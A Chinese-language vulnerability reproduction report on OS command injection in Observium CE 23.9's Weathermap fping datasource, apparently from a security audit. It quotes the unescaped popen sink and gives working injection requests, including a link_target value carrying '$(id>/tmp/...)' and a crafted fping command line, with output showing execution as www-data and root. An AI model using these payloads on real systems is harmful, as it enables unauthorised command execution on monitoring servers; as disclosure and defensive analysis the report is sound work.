# Observium Weathermap fping 数据源 OS 命令注入

> 利用方式标注：**真实 Web 路径已闭环**。完整链：admin 登录 → Web editor `set_link_properties` 注入 `fping:<target>` → Web `action=draw` 触发渲染 → `ReadData` → `popen` 命令注入，标记 `uid=33(www-data)`。

## 目标信息
- 台账名称 / 版本：`Observium v18.0`（台账版本列 `18.0`）
- **实际版本（SSH 确认）**：`Observium CE 23.9`（`/opt/observium/VERSION`）
- 业务/管理 IP：`192.168.188.x`
- 登录凭据：见本地台账（SSH 密码认证已验证）
- 系统：Debian 12 (bookworm)，内核 6.1.0-51-amd64
- Web 服务：Apache2 (80/443)，MariaDB (3306)

> 说明：台账登记的版本 `18.0` 与实际部署的 `Observium CE 23.9` 不一致，以 SSH 实测为准。

## 漏洞类型
OS 命令注入（Command Injection / CWE-78）

## 漏洞位置
```
/opt/observium/includes/weathermap/lib/datasources/WeatherMapDataSource_fping.php
function ReadData($targetstring, &$map, &$item)
```

## 根因（源码证据）
```php
if(preg_match("/^fping:(\S+)$/", $targetstring, $matches)) {
    $target = $matches[1];                 // 用户可控的 weathermap target
    ...
    $command = $this->fping_cmd." -t100 -r1 -p20 -u -C $ping_count -i10 -q $target 2>&1";
    $pipe = popen($command, "r");          // 未做 shell 转义，直接拼入 popen
```

`$target` 取自 weathermap 目标串 `fping:<target>`，未经 `escapeshellarg()` 等任何转义即拼入 `popen()` 的命令串。由于 `popen()` 经 `/bin/sh -c` 执行，`$target` 中的 `;`、`|`、`$()`、反引号等 shell 元字符会被解释，导致任意 OS 命令执行。

同类问题也存在于：
- `includes/weathermap/lib/datasources/WeatherMapDataSource_rrd.php`（`popen($command)` 未转义 args/extra_options）
- `includes/common.inc.php` 的 `external_exec()` → `proc_open('exec '.$command)` 通用执行封装（是否注入取决于调用方是否转义）

## 利用前提
- 认证要求：**已认证管理员**（能配置 weathermap 地图与 target 串；Observium 官方立场认为 admin 可信，但 admin 配置面被广泛视为高危）
- 权限结果：命令以 poller/调用进程权限执行；本机直接以 PHP CLI 触发时得到 `root`（uid=0）
- 稳定可复现：是

## 复现步骤与证据

### 0. 真实 Web 利用路径（admin → weathermap 配置注入 fping target → 渲染触发）

1. **Web 认证**：`POST /login/` 用 admin 会话拿到 OBSID cookie。
2. **Web 注入 target**：`GET /weathermap.php?action=set_link_properties&mapname=wm_poc&link_name=node00001-node00002&link_target=fping:127.0.0.1;$(id>/tmp/wm_cmdi_proof)` —— 经 editor 把 `link_target` 写入 `weathermaps.wmap_conf`（`TARGET fping:127.0.0.1;$(id>/tmp/wm_cmdi_proof)`）。
3. **Web 触发渲染**：`GET /weathermap.php?mapname=wm_poc&action=draw&width=590&height=490` → `ReadConfig` → `ReadData` → `popen` 执行注入命令。
4. **验证**（Web 侧 www-data 私有 `/tmp`）：
   ```
   marker: uid=33(www-data) gid=33(www-data) groups=33(www-data)
   ```
   注入的 `id` 命令以 www-data（uid=33）执行，标记文件落盘。

> 环境准备（等价「插件已初始化」前提）：本机 `weathermaps` 表原先不存在（插件未初始化）、`fping_cmd` 硬编码 `/usr/local/sbin/fping` 而实际在 `/usr/bin/fping`，复现时补齐了这两项，复现后已还原。

### 1. 构造恶意 target 并触发（root 侧 sink 复刻，供对照）
构造 `$target = "127.0.0.1; id > /tmp/obs_cmd_injection_proof.txt 2>&1; echo"`，按源码原样拼命令：

```
[构造命令] /usr/bin/fping -t100 -r1 -p20 -u -C 5 -i10 -q 127.0.0.1; id > /tmp/obs_cmd_injection_proof.txt 2>&1; echo 2>&1
```

### 2. 执行输出
```
127.0.0.1 : 0.032 0.037 0.032 0.042 0.056     ← fping 正常执行
```

### 3. 注入命令执行结果
```
[注入命令执行结果 /tmp/obs_cmd_injection_proof.txt]
uid=0(root) gid=0(root) groups=0(root)
```

### 4. 证明文件
```
-rw-r--r-- 1 root root 39 Sep  4 02:00 /tmp/obs_cmd_injection_proof.txt
uid=0(root) gid=0(root) groups=0(root)
```

## 结论
- **复现结果：成功**。真实 Web 路径（admin → weathermap 配置注入 fping target → 渲染触发）已闭环，注入的 `id` 命令以 **www-data（uid=33）** 执行；root 侧 sink 复刻（对照）以 root 执行。
- 置信度：**高**（真实 Web 路径 + 源码 sink + 命令执行标记均实证）。
- 影响：已认证管理员 → weathermap 渲染时在服务进程权限下任意命令执行（Web 触发为 www-data，poller/CLI 触发为 root），可进一步横向/持久化。
